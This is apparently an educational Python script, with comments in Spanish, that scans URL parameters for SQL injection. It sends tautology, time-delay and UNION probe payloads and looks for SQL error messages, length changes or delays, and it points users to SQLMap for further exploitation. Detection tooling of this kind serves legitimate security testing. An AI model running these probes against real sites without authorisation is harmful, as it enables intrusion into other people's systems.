#!/usr/bin/env python3
"""
Detector de SQL Injection Básico
================================
Herramienta educativa para detectar posibles vulnerabilidades SQLi.
Úsala SOLO en sistemas donde tengas autorización.

Uso:
    python sqli_detector.py <url_con_parametro>
    
Ejemplo:
    python sqli_detector.py "http://localhost/page.php?id=1"
"""

import requests
import sys
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode
import urllib3

# Desactivar warnings de SSL
urllib3.disable_warnings()


def banner():
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║         DETECTOR DE SQL INJECTION                 ║
    ║            Herramienta Educativa                  ║
    ╚═══════════════════════════════════════════════════╝
    """)


# Payloads de prueba para detectar SQLi
PAYLOADS = [
    # Básicos
    "'",
    "''",
    "`",
    "\"",
    
    # Comentarios
    "'--",
    "'#",
    "'/*",
    
    # Operadores lógicos
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1 OR 1=1",
    "' OR ''='",
    
    # Time-based (detectar por tiempo)
    "' OR SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    
    # UNION básico
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
]

# Errores de SQL que indican vulnerabilidad
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "syntax error",
    "microsoft sql native client error",
    "ora-01756",
    "ora-00933",
    "postgresql query failed",
    "pg_query",
    "sqlite3",
    "jdbc",
    "odbc",
    "sql error",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "mysqli_",
    "pg_exec",
    "sqlite_",
]


def get_baseline(url, params, param_to_test, cookies=None, headers=None):
    """Obtiene respuesta base sin payload"""
    try:
        response = requests.get(
            url, 
            params=params, 
            cookies=cookies, 
            headers=headers,
            timeout=10,
            verify=False
        )
        return response.text, len(response.text), response.elapsed.total_seconds()
    except Exception as e:
        print(f"[-] Error obteniendo baseline: {e}")
        return None, 0, 0


def test_payload(url, params, param_to_test, payload, cookies=None, headers=None):
    """Prueba un payload específico"""
    test_params = params.copy()
    original_value = test_params.get(param_to_test, "")
    test_params[param_to_test] = original_value + payload
    
    try:
        start_time = requests.get(
            url,
            params=test_params,
            cookies=cookies,
            headers=headers,
            timeout=15,
            verify=False
        )
        return start_time.text, len(start_time.text), start_time.elapsed.total_seconds()
    except requests.exceptions.Timeout:
        return None, 0, 15  # Timeout puede indicar time-based SQLi
    except Exception as e:
        return None, 0, 0


def check_for_errors(response_text):
    """Busca errores de SQL en la respuesta"""
    if response_text is None:
        return False, None
    
    response_lower = response_text.lower()
    for error in SQL_ERRORS:
        if error in response_lower:
            return True, error
    return False, None


def analyze_results(baseline_len, baseline_time, test_len, test_time, has_error, error_msg, payload):
    """Analiza los resultados y determina si hay vulnerabilidad"""
    findings = []
    
    # Error-based SQLi
    if has_error:
        findings.append({
            'type': 'Error-Based SQLi',
            'confidence': 'Alta',
            'payload': payload,
            'detail': f'Error SQL detectado: {error_msg}'
        })
    
    # Diferencia significativa en longitud (posible UNION o Boolean-based)
    len_diff = abs(test_len - baseline_len)
    if len_diff > 100 and "UNION" in payload:
        findings.append({
            'type': 'Posible UNION-Based SQLi',
            'confidence': 'Media',
            'payload': payload,
            'detail': f'Diferencia de {len_diff} bytes en respuesta'
        })
    
    # Time-based SQLi
    time_diff = test_time - baseline_time
    if time_diff > 2.5 and "SLEEP" in payload.upper():
        findings.append({
            'type': 'Time-Based SQLi',
            'confidence': 'Alta',
            'payload': payload,
            'detail': f'Retraso de {time_diff:.2f} segundos'
        })
    
    return findings


def test_parameter(url, params, param_to_test, cookies=None, headers=None):
    """Prueba un parámetro con todos los payloads"""
    print(f"\n[*] Probando parámetro: {param_to_test}")
    print(f"[*] Valor original: {params.get(param_to_test, '')}")
    print("-" * 50)
    
    # Obtener baseline
    print("[*] Obteniendo respuesta base...")
    base_text, base_len, base_time = get_baseline(url, params, param_to_test, cookies, headers)
    
    if base_text is None:
        print("[-] No se pudo obtener respuesta base")
        return []
    
    print(f"[*] Longitud base: {base_len} bytes")
    print(f"[*] Tiempo base: {base_time:.2f} segundos")
    print("-" * 50)
    
    all_findings = []
    
    for i, payload in enumerate(PAYLOADS, 1):
        print(f"[*] Probando payload {i}/{len(PAYLOADS)}: {payload[:30]}...")
        
        test_text, test_len, test_time = test_payload(
            url, params, param_to_test, payload, cookies, headers
        )
        
        has_error, error_msg = check_for_errors(test_text)
        
        findings = analyze_results(
            base_len, base_time,
            test_len, test_time,
            has_error, error_msg,
            payload
        )
        
        if findings:
            all_findings.extend(findings)
            for finding in findings:
                print(f"\n    ╔══════════════════════════════════════")
                print(f"    ║ ¡POSIBLE VULNERABILIDAD ENCONTRADA!")
                print(f"    ╠══════════════════════════════════════")
                print(f"    ║ Tipo: {finding['type']}")
                print(f"    ║ Confianza: {finding['confidence']}")
                print(f"    ║ Payload: {finding['payload']}")
                print(f"    ║ Detalle: {finding['detail']}")
                print(f"    ╚══════════════════════════════════════\n")
    
    return all_findings


def main():
    banner()
    
    if len(sys.argv) < 2:
        print("Uso: python sqli_detector.py <url_con_parametro>")
        print("\nEjemplo:")
        print('  python sqli_detector.py "http://localhost/page.php?id=1"')
        print('  python sqli_detector.py "http://localhost/search?q=test&page=1"')
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Parsear URL
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = parse_qs(parsed.query)
    
    # Convertir listas a valores únicos
    params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
    
    if not params:
        print("[-] No se encontraron parámetros en la URL")
        print("[-] Asegúrate de incluir parámetros como: ?id=1")
        sys.exit(1)
    
    print(f"[*] URL base: {base_url}")
    print(f"[*] Parámetros encontrados: {list(params.keys())}")
    
    # Headers personalizados
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
    }
    
    all_findings = []
    
    # Probar cada parámetro
    for param in params.keys():
        findings = test_parameter(base_url, params, param, headers=headers)
        all_findings.extend(findings)
    
    # Resumen final
    print("\n" + "=" * 60)
    print("RESUMEN DE HALLAZGOS")
    print("=" * 60)
    
    if all_findings:
        print(f"\n[!] Se encontraron {len(all_findings)} posibles vulnerabilidades:\n")
        
        for i, finding in enumerate(all_findings, 1):
            print(f"{i}. {finding['type']}")
            print(f"   Confianza: {finding['confidence']}")
            print(f"   Payload: {finding['payload']}")
            print(f"   Detalle: {finding['detail']}")
            print()
        
        print("\n[!] RECOMENDACIONES:")
        print("    1. Verifica manualmente cada hallazgo")
        print("    2. Usa SQLMap para explotación más profunda")
        print("    3. Documenta los resultados")
    else:
        print("\n[+] No se detectaron vulnerabilidades obvias")
        print("[*] Esto NO significa que sea seguro")
        print("[*] Considera pruebas manuales más profundas")
    
    print("\n")


if __name__ == "__main__":
    main()
